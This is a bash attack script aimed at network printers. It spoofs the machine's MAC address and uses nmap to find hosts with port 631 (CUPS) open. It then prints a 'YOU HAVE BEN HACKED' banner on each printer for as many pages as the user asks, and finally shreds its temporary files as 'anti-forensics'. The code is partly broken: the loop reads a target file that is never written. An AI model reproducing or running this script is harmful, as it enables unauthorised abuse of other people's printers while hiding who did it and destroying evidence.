#!/bin/bash
spoof(){
    ifconfig eth0 down;
    ifconfig eth0 hw ether $mcfodeo;
    ifconfig eth0 up; 
    sleep 1; 
} 
scan(){
    echo "[*] Scanning $1"
    NET=$(cat /etc/resolv.conf | grep nameserver | cut -d ' ' -f 2)
    TARGETS=`nmap -p 631 $1 | grep open -B 3 | grep report | cut -d ' ' -f 5 | tr ' ' '\n'`
    TOTAL=$( echo $TARGETS | wc -l | cut -f 1 -d ' ' )
}
exploit(){
    figlet "YOU HAVE BEN HACKED" > temp;
    for (( l=0; l < $pages; l++ )) ; do
	    for i in $(cat tempT); do
		    lp -h $i:631 temp 
		    sleep 2 
	    done
    done
}
forensic(){
    shred -z  temp;
    shred -z  tempT;
    rm -f temp tempT;
}
usage(){
	echo "[!] Error, please check this help"
	echo "		$0 network/mask"
	echo "		Example: $0 10.0.0.0/24"

}
### MAIN 
if [ $(id -u ) != 0 ];then
	echo "You need to run with root";
	exit 1
elif [ $# -lt 1 ];then
	usage
	exit 1
fi
echo "Alright, lets do that shit";
read -p "[*] Want Spoof your mac?[y/n]"
if [ $REPLY = 'y' ];then
	echo "Give to me the MAC you want:";
	echo "Blank for default:(53:F0:D3:07:10:00)";
	read mcfodeo
	if [ -z $mcfodeo ];then
	mcfodeo=00:53:f0:d3:07:10;	 
	fi
	echo "[*] Spoofing";
	spoof
	echo "[*] Done";
fi
echo "[*] Searching for targets";
scan $1
if [ $TOTAL -eq 1 ];then
	echo "[!] No targets found"
	exit 1
else
	echo "[*] Number of Targets found: $TOTAL";
	read -p "[+] Exploit?[y/n]";
	if [ $REPLY = 'y' ];then 
	    echo "How Many pages for printer:";
	    read pages;
	    echo "[*] Exploiting";
	    exploit
	    echo "[*] Done";
	    echo "[*] Starting Anti-Forensics";
	    forensic
	    echo "[*] Done";
	    echo "[*] Enjoy, bye";
	fi
fi
